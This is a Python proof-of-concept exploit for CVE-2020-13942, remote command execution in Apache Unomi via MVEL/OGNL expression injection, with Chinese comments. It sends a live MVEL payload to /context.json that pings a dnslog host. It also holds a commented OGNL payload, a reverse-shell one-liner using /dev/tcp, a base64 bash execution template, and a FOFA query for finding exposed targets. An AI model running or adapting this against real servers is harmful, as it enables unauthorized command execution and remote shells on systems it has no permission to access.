#@author Firbasky
import requests
import json

"""
CVE-2020-13942
Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），
用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验。
在Apache Unomi 1.5.1级以前版本中，存在一处表达式注入漏洞，
远程攻击者通过MVEL和OGNL表达式即可在目标服务器上执行任意命令。

该漏洞源于可以将恶意的OGNL或MVEL脚本注入/context.json公共端点。
"""

"""
fofa="Apache-Unomi"
"""

"""
影响版本：
Apache Unomi 1.5.2之前版本存在安全漏洞
"""

#测试ip
url = 'http://'

MVEL_exp = {
    "filters": [
        {
            "id": "sample",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"ping 06qczq.dnslog.cn\");"
                            #bash -i >& /dev/tcp/ip/port 0>&1
                            #编码后为 http://www.jackson-t.ca/runtime-exec-payloads.html
                            #bash -c {echo,}|{base64,-d}|{bash,-i}
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "sample"
}


"""
OGNL_exp = {
  "personalizations":[
    {
      "id":"gender-test",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"sample"
}
"""

MVEL_exp = json.dumps(MVEL_exp)
headers = {"Content-type": "application/json","Accept": "*/*"}
r=requests.post(url+"/context.json", data=MVEL_exp, headers=headers)
print(r.text)
